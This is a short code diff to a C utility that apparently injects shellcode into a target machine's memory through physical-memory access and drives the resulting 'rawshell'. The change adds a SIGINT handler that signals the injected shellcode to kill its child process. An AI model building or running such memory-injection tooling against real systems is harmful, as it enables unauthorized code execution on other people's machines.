@@ -32,6 +32,8 @@
 #include <errno.h>
 #include <string.h>
 
+#include <signal.h>
+
 #include <physical.h>
 #include <linear.h>
 #include <endian_swap.h>
@@ -204,6 +206,14 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 	return code_location + MARKER_LEN;
 }}}
 
+volatile int do_terminate = 0;
+
+void handle_sigint(int __attribute__ ((__unused__)) signal)
+{{{
+	printf(TERM_YELLOW "\n(rawshell)" TERM_RESET " received SIGINT. telling shellcode to kill the child...\n");
+	do_terminate = 1;
+}}}
+
 void use_shell(linear_handle lin, uint32_t base)
 {{{
 	// these depend on the used shellcode:
@@ -219,7 +229,7 @@ void use_shell(linear_handle lin, uint32_t base)
 #define RTO_READER_POS	0x237
 #define RTO_BUFFER	(0x240 + 276)
 
-	const uint8_t true_value = 0x1;
+	uint8_t true_value = 0x1;
 
 	uint8_t child_is_dead = 0;
 
@@ -248,6 +258,8 @@ void use_shell(linear_handle lin, uint32_t base)
 	fcntl(STDIN_FILENO, F_SETFL, flags);
 
 	printf(TERM_YELLOW "(rawshell)" TERM_RESET " rfrm_writer_pos is @0x%08x (offset 0x%03x).\n", base + RFRM_WRITER_POS, RFRM_WRITER_POS);
+
+	signal(SIGINT, handle_sigint);
 
 	// while the child lives
 	while(!child_is_dead) {
@@ -279,6 +291,9 @@ void use_shell(linear_handle lin, uint32_t base)
 		} else {
 			rto_active = 0;
 		}
+
+		if(do_terminate)
+			DO_terminate_child;
 
 		if(!rfrm_active && !rto_active)
 			usleep(50000);
